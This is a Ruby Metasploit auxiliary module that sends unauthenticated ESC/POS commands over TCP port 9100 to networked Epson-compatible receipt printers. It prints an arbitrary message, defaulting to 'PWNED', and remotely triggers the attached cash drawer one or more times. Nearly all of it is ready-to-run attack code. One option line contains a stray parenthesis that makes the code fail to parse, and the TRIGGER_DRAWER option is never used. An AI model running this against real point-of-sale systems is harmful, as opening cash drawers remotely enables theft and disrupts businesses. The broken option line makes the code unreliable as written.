
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'ESC/POS Printer Command Injector',
      'Description' => %q{
        This module exploits an unauthenticated ESC/POS command vulnerability in networked Epson-compatible printers.
        You can print a custom message, trigger the attached cash drawer, or do both.
      },
      'Author'      => ['FutileSkills'],
      'License'     => MSF_LICENSE,
      'References'  => [
        ['URL', 'https://github.com/futileskills/Security-Advisory']
      ],
      'Actions'     =>
        [
          ['PRINT', { 'Description' => 'Print a message to the printer' }],
          ['DRAWER', { 'Description' => 'Trigger the attached cash drawer' }],
          ['BOTH', { 'Description' => 'Print and trigger the drawer' }]
        ],
      'DefaultAction' => 'PRINT'
    ))

    register_options(
      [
        Opt::RPORT(9100),                                  # Default printer port
        OptString.new('MESSAGE', [true, 'Message to print', 'PWNED']), conditions: %w[ACTION != DRAWER]),
        OptBool.new('TRIGGER_DRAWER', [false, 'Trigger the attached cash drawer', false]),
        OptInt.new('DRAWER_COUNT', [true, 'Number of times to trigger the drawer', 2])
      ]
    )
  end

  # ESC/POS command to trigger the cash drawer
  DRAWER_COMMAND = "\x1b\x70\x00\x19\x32".freeze

  def run
    rhost_ip = rhost
    message = datastore['MESSAGE']
    trigger_drawer = datastore['TRIGGER_DRAWER']
    drawer_count = datastore['DRAWER_COUNT'].to_i.clamp(1, 10)  # Clamp for safety

    case action.name
    when 'PRINT'
      send_print(rhost_ip, message)
    when 'DRAWER'
      send_drawer(rhost_ip, drawer_count)
    when 'BOTH'
      send_print(rhost_ip, message)
      send_drawer(rhost_ip, drawer_count)
    else
      print_error("Unknown action: #{action.name}")
    end
  end

  def send_print(rhost_ip, message)
    print_commands = "\x1b\x40\x1b\x61\x01\x1d\x21\x11#{message}\x1d\x21\x00\n\x1b\x61\x00\n\n\x1d\x56\x42"
    print_status("Sending print message to #{rhost_ip}...")
    begin
      connect
      sock.put(print_commands)
      disconnect
      print_good("Printed message to #{rhost_ip}")
    rescue ::Rex::ConnectionError
      print_error("Failed to connect to #{rhost_ip} for printing")
    end
  end

  def send_drawer(rhost_ip, count)
    print_status("Triggering cash drawer #{count} times on #{rhost_ip}...")
    count.times do
      begin
        connect
        sock.put(DRAWER_COMMAND)
        disconnect
        sleep(0.5)
      rescue ::Rex::ConnectionError
        print_error("Failed to connect to #{rhost_ip} for drawer trigger")
        break
      end
    end
    print_good("Triggered cash drawer on #{rhost_ip}")
  end
end
